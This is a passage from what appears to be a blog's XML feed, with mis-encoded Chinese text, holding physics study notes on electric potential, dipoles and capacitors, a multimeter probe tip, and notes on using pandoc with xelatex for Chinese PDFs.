å·²çŸ¥ç”µè·é‡æ±‚ç”µåŠ¿çš„é¢˜. </p><p><img src="/../img/potential_comes_two_charges.png"></p><p>ä¸»è¦å°±æ˜¯åˆ©ç”¨:<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r}<br>$$<br>è¿™ä¸ªä½“ç°ç”µåŠ¿å’Œç”µè·å…³ç³»çš„å…¬å¼.</p><p>åˆ†åˆ«è®¡ç®—ä¸¤ä¸ªç”µè·äº§ç”Ÿçš„ç”µåŠ¿å¹¶ç›¸åŠ .</p><h2 id="21-4-å‡åŒ€åˆ†å¸ƒçš„ç”µè·äº§ç”Ÿçš„ç”µåŠ¿-Potential-Due-to-Any-Charge-Distribution"><a href="#21-4-å‡åŒ€åˆ†å¸ƒçš„ç”µè·äº§ç”Ÿçš„ç”µåŠ¿-Potential-Due-to-Any-Charge-Distribution" class="headerlink" title="21-4 å‡åŒ€åˆ†å¸ƒçš„ç”µè·äº§ç”Ÿçš„ç”µåŠ¿ Potential Due to Any Charge Distribution"></a>21-4 å‡åŒ€åˆ†å¸ƒçš„ç”µè·äº§ç”Ÿçš„ç”µåŠ¿ Potential Due to Any Charge Distribution</h2><p>ä¹Ÿå°±æ˜¯æ±‚å­˜åœ¨å¤šä¸ª charge çš„ç”µåœºä¸­çš„ potential.</p><p>æ ¹æ®å·²å­¦çš„å…¬å¼, å·²çŸ¥ Q æˆ– E éƒ½èƒ½ç”¨äºè®¡ç®— V.<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \frac{Q}{r}<br>$$<br>å¤šä¸ªç”µåœºæ—¶å…¬å¼å˜ä¸º:<br>$$<br>V_a &#x3D; \sum_{i&#x3D;1}^n V_i &#x3D; \frac{1}{4\pi \epsilon_0} \sum_{i&#x3D;1}^n \frac{Q_i}{r_ia}<br>$$<br>è¿™é‡Œå°±ä½“ç°äº†å°†æ¯ä¸ªç”µè·ä½œç”¨çš„ç”µåŠ¿ç´¯åŠ .</p><p>å¦‚æœç”µè·æ˜¯å‡åŒ€åˆ†å¸ƒçš„, é‚£å°±å¯ä»¥å†™ä¸º:<br>$$<br>V &#x3D; \frac{1}{4\pi \epsilon_0} \int\frac{dq}{r}<br>$$</p><h3 id="ä¹ é¢˜-21-8"><a href="#ä¹ é¢˜-21-8" class="headerlink" title="ä¹ é¢˜ 21-8"></a>ä¹ é¢˜ 21-8</h3><p>charge å‡åŒ€åˆ†å¸ƒåœ¨åœ†ç¯ä¸Š, ç›´æ¥ç”¨å…¬å¼ç§¯åˆ†å°±è¡Œ:<br><img src="/../img/charge_on_ring_distribute.png"></p><h3 id="ä¹ é¢˜-21-9"><a href="#ä¹ é¢˜-21-9" class="headerlink" title="ä¹ é¢˜ 21-9"></a>ä¹ é¢˜ 21-9</h3><p>charge å‡åŒ€åˆ†å¸ƒåœ¨åœ†ç›˜ä¸Š, æ€è·¯å°±æ˜¯å…ˆæ±‚ç¯çš„ç§¯åˆ†, å†æ±‚æ•´ä¸ªç›˜. æ±‚ç¯çš„ç§¯åˆ†, æ±‚çš„æ˜¯å…¶ä¸Šçš„ç”µè·é‡.<br><img src="/../img/charge_distribute_on_disk.png"></p><p>åˆ©ç”¨äºŒé‡ç§¯åˆ†è®¡ç®—çš„æ€è·¯, ä¸»è¦è¦æ±‚å‡ºå•ä¸ªç‚¹å¤„çš„ç”µåŠ¿. å¯ä»¥åˆ©ç”¨:<br>$$<br>\frac{dq}{dA} &#x3D; \frac{Q}{A}<br>$$<br>è¿™æ ·çš„ç­‰å¼.</p><h2 id="21-5-ç­‰åŠ¿é¢-Equipotential-Surfaces"><a href="#21-5-ç­‰åŠ¿é¢-Equipotential-Surfaces" class="headerlink" title="21.5 ç­‰åŠ¿é¢ Equipotential Surfaces"></a>21.5 ç­‰åŠ¿é¢ Equipotential Surfaces</h2><p>ç”µåŠ¿èƒ½å¤Ÿé€šè¿‡ç”»ç­‰åŠ¿é¢æ¥è¡¨ç¤º, ç­‰åŠ¿é¢å°±æ˜¯è¿™ä¸ªé¢ä¸Šæ‰€æœ‰çš„ç‚¹, å…¶ç”µåŠ¿éƒ½ç›¸åŒ. </p><p>é¢ä¸Šä¸¤ç‚¹ä¹‹é—´çš„ç”µåŠ¿å·®ä¸ºé›¶, åœ¨åŒä¸€ç­‰åŠ¿é¢ä¸Šç§»åŠ¨ä¸åšåŠŸ.</p><p>ç­‰åŠ¿é¢ä¸€å®šæ˜¯å’Œç”µåœºå‚ç›´. </p><p><mark>ç†è§£ä¸ºä»€ä¹ˆæ˜¯å‚ç›´çš„?&lt;\mark&gt;</p><p>ä»å‰é¢å¯ä»¥çŸ¥é“, ç­‰åŠ¿é¢ä¸Šæ‰€æœ‰çš„ç‚¹çš„ç”µåŠ¿æ˜¯ç›¸åŒçš„, åœ¨å…¶ä¸Šçš„ç§»åŠ¨ä¸åšåŠŸ, å¦‚æœç”µåœºä¸æ˜¯å‚ç›´çš„, å¦‚:<br><img src="/../img/charge_move_on_equipotential_surface.png"></p><p>é‚£ä¹ˆå°±ä¼šæœ‰åœ¨å…¶ç§»åŠ¨æ–¹å‘ä¸Šçš„åˆ†é‡, å°±ä¼šåšåŠŸ, ä¸æ»¡è¶³.</p><p>ä» $\Delta V &#x3D; - \int E \cdot dl$ è¿™ä¸ªå…¬å¼ä¹Ÿèƒ½çœ‹å‡º, å½“ $\Delta V$ ä¸º 0 æ—¶, ä¹Ÿå°±æ˜¯ä¸¤ä¸ªå‘é‡ç›¸äº’å‚ç›´.</p><p>ç”µåœºçº¿çš„æ–¹å‘æ˜¯ä»é«˜ç”µåŠ¿æŒ‡å‘ä½ç”µåŠ¿.</p><p>è¿™é‡Œåˆæåˆ°äº†, åœ¨é™ç”µåœºä¸­, å¯¼ä½“å†…éƒ¨çš„ç”µåœºä¸ºé›¶, å› ä¸ºå¯¼ä½“å†…çš„ç”µè·æ˜¯è‡ªç”±æµåŠ¨çš„, è‹¥æ˜¯æ”¶åˆ°äº†ç”µåœºåŠ›çš„ä½œç”¨, å…¶ä¼šç§»åŠ¨, ç›´åˆ°å¹³è¡¡.</p><p>å¯¼ä½“çš„è¡¨é¢å°±æ˜¯ä¸€ä¸ªç­‰åŠ¿é¢. ç”µåœºçº¿å’Œå¯¼ä½“è¡¨é¢å§‹ç»ˆå‚ç›´. (æ¯•ç«Ÿå†…éƒ¨ä¸º 0, å‘é‡å‚ç›´)</p><h2 id="21-6-Electric-Dipoles"><a href="#21-6-Electric-Dipoles" class="headerlink" title="21.6 Electric Dipoles"></a>21.6 Electric Dipoles</h2><p>è¿˜æ˜¯å’Œä¹‹å‰æŸä¸€èŠ‚ä¸­è®²çš„ç›¸åŒçš„æ¦‚å¿µ:</p><p>ä¸¤ä¸ªç”µè·, å…·æœ‰ç›¸åŒçš„ç”µè·é‡, ç”µæ€§ç›¸å, é—´éš” a distance $l$, è¢«ç§°ä½œ electric dipole.</p><p>å…¶é€šè¿‡ç”¨ç”µè·é‡æ¥è®¡ç®—ç”µåŠ¿çš„å…¬å¼ä¸º:<br>$$<br>V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q}{r} + \frac{1}{4 \pi \epsilon_0} \frac{-Q}{r + \Delta r} &#x3D; \frac{Q}{4 \pi \epsilon_0} \frac{\Delta r}{r( r+\Delta r )}<br>$$<br>è¿™é‡Œ, å½“ $r$ è¿œå¤§äº $l$ æ—¶, æˆ‘ä»¬åˆçŸ¥é“ $\Delta r \approx l cos\theta$, å› æ­¤ $r &gt;&gt; \Delta r$, å°±å¯ä»¥å°†å…¶åœ¨åˆ†æ¯éƒ¨åˆ†å¿½ç•¥, äºæ˜¯å…¬å¼å˜æˆ:<br>$$<br>V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Ql cos\theta}{r^2} &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{p cos\theta}{r^2}<br>$$<br>è¿™é‡Œ $p &#x3D; Ql$, p å°±æ˜¯ dipole moment.<br><img src="/../img/dipole_moment_two.png"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œä¸ºä»€ä¹ˆæ˜¯ $\Delta r \approx l cos\theta$, å½“ $r &gt;&gt; l$ æ—¶, $\theta \approx 90^\circ$, $r_1$ å’Œ $r_2$ å‡ ä¹å¹³è¡Œ.</p><p>$\theta$ æ˜¯è´Ÿç”µè·é‚£è¾¹çš„è§’åº¦, å…¶å†³å®šäº† $V$ çš„æ­£è´Ÿå€¼, å½“å…¶ä¸º $0^\circ \sim 90^\circ$ æ—¶, $V$ ä¸ºæ­£, å…¶ä¸º $90^\circ \sim 180^\circ$ æ—¶, ä¸ºè´Ÿ.</p><p>dipole çš„ potential éš $r$ çš„å˜åŒ–è€Œå˜åŒ–å¾—æ¯”å•ä¸ª charge æ›´å¿«:</p><p>dipole -&gt; $\frac{1}{r^2}$</p><p>sigle charge -&gt; $\frac{1}{r}$</p><h3 id="ä¹ é¢˜-21-10"><a href="#ä¹ é¢˜-21-10" class="headerlink" title="ä¹ é¢˜ 21-10"></a>ä¹ é¢˜ 21-10</h3><p>ç¬¬ä¸€ä¸ªé—®æ˜¯å·²çŸ¥ dipole moment å’Œ distance æ±‚ dipole çš„ç”µè·é‡.<br>åˆ©ç”¨ $Q &#x3D; \frac{p}{l}$ å¯ä»¥è®¡ç®—.</p><p>ç¬¬äºŒé—®æ˜¯å·²çŸ¥è·ç¦»æ±‚ potential, å…ˆç”»å›¾åˆ¤æ–­æ­£è´Ÿ<br><img src="/../img/carbon_oxygen_dipole.png"></p><p>è®°ä½, $\theta$ åœ¨é è¿‘è´Ÿç”µè·çš„é‚£ä¸€è¾¹.</p><p>ç„¶ååˆ©ç”¨:<br>$$<br>V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{p \cos \theta}{r^2}<br>$$<br>æ¥é€šè¿‡ distance å’Œ dipole moment ç®— potential.<br><img src="/../img/carbon_oxygen_dipole_question.png"></p><h2 id="21-7-E-Determined-from-V"><a href="#21-7-E-Determined-from-V" class="headerlink" title="21.7 E Determined from V"></a>21.7 E Determined from V</h2><p>å¾®åˆ†å½¢å¼:<br>$dV &#x3D; -E \cdot dl &#x3D; -E_1 dl$<br>è¿™é‡Œçš„ $E_1$ æ˜¯ $E$ åœ¨ $dl$ æ–¹å‘çš„åˆ†é‡.</p><p>å¯ä»¥å†™æˆ:<br>$E_1 &#x3D; - \frac{dV}{dl}$</p><p>è¿™é‡Œçš„ $\frac{dV}{dl}$ ä¹Ÿè¢«ç§°ä¸º V åœ¨æŸä¸ªç‰¹å®šæ–¹å‘çš„æ¢¯åº¦. å¦‚æœæ–¹å‘æ²¡æœ‰æŒ‡æ˜, è¿™é‡Œå°±æŒ‡ V å˜åŒ–æœ€å¿«çš„æ–¹å‘.</p><p>å¦‚æœ E æ˜¯ $x,y,z$ çš„æ–¹ç¨‹, é‚£ä¹ˆ:</p><p>$E_x &#x3D; - \frac{\partial V}{\partial x}$, $E_y &#x3D; - \frac{\partial V}{\partial y}$, $E_z &#x3D; - \frac{\partial V}{\partial z}$</p><h3 id="ä¹ é¢˜-21-11"><a href="#ä¹ é¢˜-21-11" class="headerlink" title="ä¹ é¢˜ 21-11"></a>ä¹ é¢˜ 21-11</h3><p>åˆ©ç”¨è¿™ä¸¤ä¸ªå›¾:<br><img src="/../img/two_pic_ring_and_disk.png"></p><p>åªä¸è¿‡ä½¿ç”¨ $x,y,z$ çš„æ–¹ç¨‹è®¡ç®—. ä¸€èˆ¬å…ˆç®—å‡º V, å†è®¡ç®— E. (V æ˜¯æ ‡é‡, E æ˜¯çŸ¢é‡).</p><p>è¿™é‡Œæåˆ°äº† gradient operator: $\Delta &#x3D; i \frac{\partial}{\partial x} + j \frac{\partial}{\partial y} + k \frac{\partial}{\partial z}$</p><h2 id="21-8-ç”µåŠ¿èƒ½-ç”µå­ä¼ç‰¹-Electrostatic-Potential-Energy-the-Electron-Volt"><a href="#21-8-ç”µåŠ¿èƒ½-ç”µå­ä¼ç‰¹-Electrostatic-Potential-Energy-the-Electron-Volt" class="headerlink" title="21.8 ç”µåŠ¿èƒ½, ç”µå­ä¼ç‰¹ Electrostatic Potential Energy; the Electron Volt"></a>21.8 ç”µåŠ¿èƒ½, ç”µå­ä¼ç‰¹ Electrostatic Potential Energy; the Electron Volt</h2><p>è¿™ä¸€èŠ‚å°† $eV$ è¿™ä¸ªå•ä½. <mark>ä¸ºä»€ä¹ˆè¦å¼•å…¥è¿™ä¸ªå•ä½ ?</mark> </p><p>ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªç”µå­æ‰€åšçš„åŠŸ.</p><p>è‹¥ç³»ç»Ÿä¸­åªæœ‰ä¸€ä¸ªç”µè·, é‚£ä¹ˆä¹Ÿå°±ä¸å­˜åœ¨ potential energy, ä½†å¦‚æœç³»ç»Ÿä¸­æœ‰ä¸¤ä¸ªç”µè·:</p><p>$V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q_1}{r_{12}}$</p><p>$r_{12}$ æ˜¯ä¸¤ä¸ªç”µè·çš„è·ç¦»:</p><p>$U &#x3D; Q_2 V &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{Q_1 Q_2}{r_{12}}$</p><p>å¦‚æœæœ‰ä¸‰ä¸ª, é‚£ä¹ˆæ€»çš„ potential energy å°±æ˜¯:<br>$$<br>U &#x3D; \frac{1}{4 \pi \epsilon_0} ( \frac{Q_1 Q_2}{r_{12}} + \frac{Q_1 Q_3}{r_{13}} +\frac{Q_2 Q_3}{r_{23}} )<br>$$<br>ä¸¤ä¸¤ç»„åˆ.</p><p>$1 eV &#x3D; 1.6 \times 10^{-19} J$</p><h3 id="ä¹ é¢˜-21-12"><a href="#ä¹ é¢˜-21-12" class="headerlink" title="ä¹ é¢˜ 21-12"></a>ä¹ é¢˜ 21-12</h3><p>è®¡ç®—å°†æ°§åŸå­ä¸Šçš„ proton å’Œ electron åˆ†å¼€éœ€è¦çš„èƒ½é‡, éœ€è¦è®°å¾—åŠ ä¸Šç”µå­åœ¨è½¨é“ä¸Šè¿åŠ¨çš„åŠ¨èƒ½.<br><img src="/../img/disassembling_a_hydrogen_atom.png"></p><p>å‰ä¸€éƒ¨åˆ†è®¡ç®—çš„å®é™…ä¸Šæ˜¯ä»æ— ç©·è¿œå¤„ç§»åˆ°ç›¸éš” $l$ å¤„æ‰€éœ€è¦çš„èƒ½é‡:<br><img src="/../img/disassembling_hydrogen.png"></p><h1 id="Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage"><a href="#Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage" class="headerlink" title="Chapter 22 Capacitance, Dielectrics, Electric Energy Storage"></a>Chapter 22 Capacitance, Dielectrics, Electric Energy Storage</h1><h2 id="22-1-Capacitors"><a href="#22-1-Capacitors" class="headerlink" title="22.1 Capacitors"></a>22.1 Capacitors</h2><p>A capacitor æœ‰æ—¶ä¹Ÿè¢«ç§°ä¸º condenser, å¯ä»¥å­˜å‚¨ electric charge, å¸¸å¸¸ç”±ä¸¤ä¸ªå¯¼ä½“, æ”¾å¾—æ¥è¿‘ä½†æ˜¯ä¸æ¥è§¦ç»„æˆ.</p><p>éå¸¸å°çš„ capacitors ç”¨æ¥ç”µè„‘ RAM ä¸­å­˜å‚¨ 0 å’Œ 1 çš„äºŒè¿›åˆ¶.</p><p>å¸¸å¸¸ä¸¤ä¸ªæ¿å­å·æˆåœ†æŸ±ä½“, ä¸­é—´å¤¹ç€çº¸æˆ–è€…å…¶ä»– insulator:<br><img src="/../img/capacitor_seperate_by_insulators.png"></p><p>capacitor çš„ symbol ä¸º:<br><img src="/../img/capacitor_symbol.png"></p><p>ç”µæºä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯ capacitor, ä»å…¶ç¬¦å·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥:<br><img src="/../img/source_symbol.png"></p><p>å°†ç”µæºå’Œ capacitor è”é€šå¯ä»¥å……ç”µ:<br>$$<br>Q &#x3D; C V_{ab}<br>$$<br><img src="/../img/charge_capacitors.png"></p><p>è¿™é‡Œçš„ $C$ å°±æ˜¯ capacitance of the capacitor. å•ä½æ˜¯ $C &#x2F; V$, å³ $F$, a farad.</p><p>$C$ çš„å€¼å–å†³ä¸ capacitor çš„å¤§å°, å½¢çŠ¶, ä¸¤ä¸ªå¯¼ä½“çš„ç›¸å¯¹è·ç¦», ä»¥åŠææ–™.</p><h2 id="22-2-Dtermination-of-Capacitance"><a href="#22-2-Dtermination-of-Capacitance" class="headerlink" title="22.2 Dtermination of Capacitance"></a>22.2 Dtermination of Capacitance</h2><p>æ¨å¯¼å…¬å¼, è¿™é‡Œå‡è®¾ capacitors çš„å½¢çŠ¶ç®€å•, ä¹‹é—´çš„ insulator ä¸ºçœŸç©ºæˆ–ç©ºæ°”, ä¸¤ä¸ª conductor ä¹‹é—´çš„è·ç¦» $d$ å¾ˆçŸ­, æ¯ä¸€ä¸ª plate çš„é¢ç§¯ä¸º A.</p><p>æ ¹æ® $E &#x3D; \frac{\sigma}{\epsilon_0}$ å’Œ $\sigma &#x3D; \frac{Q}{A}$ å¾—åˆ°:<br>$$<br>E &#x3D; \frac{Q}{\epsilon_0 A}<br>$$<br>åˆå› ä¸º:<br>$$<br>V_{ba} &#x3D; - \int_a^b E \cdot dl<br>$$<br>è¿™é‡Œæ˜¯ç‚¹ä¹˜, ä¹Ÿå°±æ˜¯å‘é‡, éœ€è¦çŸ¥é“ E å’Œ $dl$ ä¹‹é—´çš„è§’åº¦, ä»å›¾ä¸Šå¯ä»¥çœ‹å‡º, a -&gt; b çš„æ–¹å‘å’Œ E çš„æ–¹å‘ç›¸å, åˆ™ $\theta &#x3D; 180^\circ$, å³ $\cos 180^\circ &#x3D; -1$:<br><img src="/../img/derive_equation_of_capacitance.png"></p><p>åˆ™æœ‰:<br>$$<br>V_{ba} &#x3D; V_b - V_a &#x3D; -\int_a^b E dl \cos 180^\circ &#x3D; +\int_a^b E dl &#x3D; \frac{Q}{\epsilon_0 A} \int_a^b dl &#x3D; \frac{Q d}{\epsilon_0 A}<br>$$</p><p>æœ€ç»ˆ:<br>$$<br>C &#x3D; \frac{Q}{V_{ba}} &#x3D; \epsilon_0 \frac{A}{d}<br>$$</p><h3 id="ä¹ é¢˜-22-1"><a href="#ä¹ é¢˜-22-1" class="headerlink" title="ä¹ é¢˜ 22-1"></a>ä¹ é¢˜ 22-1</h3><p>(a) å·²çŸ¥é¢ç§¯ A å’Œ distance d æ±‚ capacitance. åˆ©ç”¨ $C &#x3D; \epsilon_0 \frac{A}{d}$ è®¡ç®—.</p><p>(b) å·²çŸ¥ C å’Œ V è®¡ç®— Q.</p><p>(c) å·²çŸ¥ Q è®¡ç®— E.</p><h3 id="ä¹ é¢˜-22-2"><a href="#ä¹ é¢˜-22-2" class="headerlink" title="ä¹ é¢˜ 22-2"></a>ä¹ é¢˜ 22-2</h3><p>è¿™é“é¢˜æ˜¯è®©æˆ‘ä»¬æ¨å¯¼å‡ºä¸€ä¸ªè®¡ç®— C çš„å…¬å¼, ä¸€ä¸ªé‡ç‚¹åœ¨äºæ±‚ a long wire å¤–çš„ç”µåœº:<br><img src="/../img/cylindrical_capacitor.png"></p><p>ä¸‹é¢çš„é‚£ä¸ªæ˜¯æˆªé¢å›¾.</p><p>a long wire å¤–çš„ç”µåœºçš„æ¨å¯¼å¼ä¸º:<br>$$<br>dq &#x3D; \lambda dl<br>$$<br>å½¢æˆçš„ç”µåœº $dE$ ä¸º:<br>$$<br>dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dq}{r^2}<br>$$<br><img src="/../img/long_wire_field.png"></p><p>å› ä¸º $E_y &#x3D; 0$ æˆ‘ä»¬å¯ä»¥çŸ¥é“:<br>$$<br>E &#x3D; E_x &#x3D; \int dE \cos \theta<br>$$<br>åˆ $y &#x3D; x \tan \theta$, å…·ä½“çœ‹ä¹¦, çº¦å»ä¸€éƒ¨åˆ†åå°±æœ‰äº†:<br>$$<br>E &#x3D; \frac{1}{2 \pi \epsilon_0} \frac{\lambda}{x}<br>$$</p><h3 id="ä¹ é¢˜-22-3"><a href="#ä¹ é¢˜-22-3" class="headerlink" title="ä¹ é¢˜ 22-3"></a>ä¹ é¢˜ 22-3</h3><p>è¿™é“é¢˜æ˜¯ä¸¤ä¸ªåŒå¿ƒçƒ, å›¾åƒåŒæ ·æ˜¯æˆªé¢å›¾:<br><img src="/../img/spherical_capacitor.png"></p><p>ä¸»è¦è¿˜æ˜¯å…ˆæ±‚ç”µåœº, ç„¶åå†åˆ©ç”¨ $V_{ab} &#x3D; -\int E \cdot dl$ æ¥æ±‚ç”µåŠ¿.</p><p>è¿™é‡Œæ±‚ç”µåœºç”¨çš„æ˜¯é«˜æ–¯å®šç†. å…¶ç®—å‡º, the electric field outside a uniformly charged conducting sphere is $E &#x3D; \frac{Q}{4 \pi \epsilon_0 r^2}$.</p><p>åªæœ‰ä¸€å±‚ conductor çš„ä¹Ÿå¯ä»¥ capacitor, åªä¸è¿‡å‡è®¾ä¸å¦ä¸€å±‚çš„è·ç¦»ä¸º $\infty$</p><h2 id="22-3-Capacitors-in-Series-and-Parallel"><a href="#22-3-Capacitors-in-Series-and-Parallel" class="headerlink" title="22.3 Capacitors in Series and Parallel"></a>22.3 Capacitors in Series and Parallel</h2>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Electric-Circuits-Notes</title>
    <link href="/2022/10/07/Electric-Circuits-Notes/"/>
    <url>/2022/10/07/Electric-Circuits-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-VOLTAGE-CURRENT-POWER-AND-SOURCES"><a href="#Chapter-1-VOLTAGE-CURRENT-POWER-AND-SOURCES" class="headerlink" title="Chapter 1 VOLTAGE, CURRENT, POWER, AND SOURCES"></a>Chapter 1 VOLTAGE, CURRENT, POWER, AND SOURCES</h1>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>çº¢é»‘è¡¨ç¬”çš„ä½¿ç”¨</title>
    <link href="/2022/10/07/%E7%BA%A2%E9%BB%91%E8%A1%A8%E7%AC%94%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/07/%E7%BA%A2%E9%BB%91%E8%A1%A8%E7%AC%94%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="çº¢é»‘çº¿æ’çš„ä½ç½®"><a href="#çº¢é»‘çº¿æ’çš„ä½ç½®" class="headerlink" title="çº¢é»‘çº¿æ’çš„ä½ç½®"></a>çº¢é»‘çº¿æ’çš„ä½ç½®</h1><p>COM (common) å­”, ä¸ºå…¬å…±å­”, æ’é»‘è‰²è¡¨ç¬”.</p><p>å…¶ä»–çš„å­”ä¸ºæ’çº¢è¡¨ç¬”.</p><h1 id="ç”µæµçš„è¿›å…¥å’Œè¾“å‡º"><a href="#ç”µæµçš„è¿›å…¥å’Œè¾“å‡º" class="headerlink" title="ç”µæµçš„è¿›å…¥å’Œè¾“å‡º"></a>ç”µæµçš„è¿›å…¥å’Œè¾“å‡º</h1><p>é»‘è¡¨ç¬”æ¥è´Ÿæ, çº¢è¡¨ç¬”æ¥æ­£æ.</p><p>ä½¿ç”¨ä¸‡ç”¨è¡¨å†…éƒ¨ç”µæºæ—¶, çº¢è¡¨ç¬”æ¥çš„å†…éƒ¨ç”µæºçš„æ­£æ, é»‘è¡¨ç¬”æ¥çš„å†…éƒ¨ç”µæºçš„è´Ÿæ.</p><p>çº¢æ­£é»‘è´Ÿ â€“ ä¾¿äºè®°å¿†.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-pandoc-æ— æ³•å¤„ç†ä¸­æ–‡</title>
    <link href="/2022/10/07/%E5%85%B3%E4%BA%8E-pandoc-%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E4%B8%AD%E6%96%87/"/>
    <url>/2022/10/07/%E5%85%B3%E4%BA%8E-pandoc-%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E4%B8%AD%E6%96%87/</url>
    
    <content type="html"><![CDATA[<p>åŸæœ¬æƒ³å°† markdown æ–‡ä»¶è½¬æ¢æˆ pdf æ–‡ä»¶, ç»“æœé‡åˆ°äº†:<br><img src="/../img/pandoc_error.png" alt="pandoc error"></p><h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://www.jianshu.com/p/15e5b9faad01">å‚è€ƒ1</a></h1><p>ç”±äºç¼–è¯‘ pandoc é»˜è®¤çš„ latex å¼•æ“æ˜¯ pdflatex, å…¶ä¸æ”¯æŒä¸­æ–‡.  </p><p>éœ€è¦æ‰‹åŠ¨è®¾ç½®ç¼–è¯‘æ—¶æ‰€å¼•ç”¨çš„å¼•æ“, æ”¹ä¸º xelatex:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc infile.md -o outfile.pdf --latex-engine=xelatex<br></code></pre></td></tr></table></figure><p>è¿˜éœ€è®¾ç½®ä¸­æ–‡å­—ä½“. éœ€å’Œç³»ç»Ÿä¸­å·²è£…çš„å­—ä½“ç›¸åŒ.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc infile.md -o outfile.pdf --latex-engine=xelatex -V mainfont=<span class="hljs-string">&quot;SimSun&quot;</span><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://jdhao.github.io/2017/12/10/pandoc-markdown-with-chinese/">å‚è€ƒ2</a></h1><p>Pandoc å°† Markdown æ–‡ä»¶è½¬ä¸º PDF æ–‡ä»¶çš„æ­¥éª¤:</p><ul><li>å°† Markdown æ–‡ä»¶è½¬ä¸º LaTeX æºæ–‡ä»¶</li><li>è°ƒç”¨ç³»ç»Ÿçš„ <code>pdflatex</code>, <code>xelatex</code> æˆ–å…¶ä»–å‘½ä»¤, å°† <code>.tex</code> æ–‡ä»¶è½¬æ¢ä¸ºæœ€ç»ˆçš„ PDF æ–‡ä»¶.</li></ul><p>ä½¿ç”¨ <code>CJKmainfont</code> æŒ‡å®šå­—ä½“.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc --pdf-engine=xelatex -V CJKmainfont=<span class="hljs-string">&quot;font name&quot;</span> test.md -o test1.pdf<br></code></pre></td></tr></table></figure><p>å¯ä½¿ç”¨ <code>fc-list</code> æ¥æŸ¥çœ‹ç³»ç»Ÿä¸­å®‰è£…çš„å­—ä½“.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ fc-list :lang=zh<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨æŠ€å·§"><a href="#ä½¿ç”¨æŠ€å·§" class="headerlink" title="ä½¿ç”¨æŠ€å·§"></a>ä½¿ç”¨æŠ€å·§</h2><p>Pandoc æ”¯æŒ YAML æ ¼å¼çš„ header, é€šè¿‡ header å¯ä»¥æŒ‡å®šæ–‡ç« çš„æ ‡é¢˜, ä½œè€…, æ›´æ–°æ—¶é—´ç­‰ä¿¡æ¯.</p><p>å¦‚:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <br><span class="hljs-attr">author:</span><br><span class="hljs-attr">date:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><p>æˆ‘ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pandoc --pdf-engine=xelatex -V CJKmainfont=<span class="hljs-string">&quot;WenQuanYi Zen Hei Mono&quot;</span> solution.md -o test.pdf<br></code></pre></td></tr></table></figure><p>è¿™è¡Œå‘½ä»¤, èƒ½å¤Ÿæ­£ç¡®è¯†åˆ«å’Œæ˜¾ç¤ºä¸­æ–‡, å°±æ˜¯æ’ç‰ˆå‡ºäº†å¤§é—®é¢˜.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pandoc-å‘½ä»¤çš„ä½¿ç”¨</title>
    <link href="/2022/10/07/Pandoc-%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/07/Pandoc-%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pandoc.org/getting-started.html">å®˜ç½‘</a><br>æŸ¥çœ‹ man page.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-Swarm-ç›¸å…³</title>
    <link href="/2022/10/07/Docker-Swarm-%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/10/07/Docker-Swarm-%E7%9B%B8%E5%85%B3/</url>
    
